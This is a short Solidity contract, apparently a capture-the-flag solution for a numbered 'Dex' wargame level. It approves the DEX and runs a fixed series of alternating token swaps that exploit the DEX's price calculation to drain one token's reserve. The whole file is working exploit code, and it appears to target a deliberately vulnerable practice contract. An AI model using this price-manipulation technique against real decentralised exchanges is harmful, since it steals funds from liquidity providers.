// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./22-Dex.sol";

contract DexAttacker {
    Dex public dex;

    constructor(address DexAddress) public {
        dex = Dex(DexAddress);
    }

    function attack() public {
        dex.approve(address(dex), 250);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
    }
}
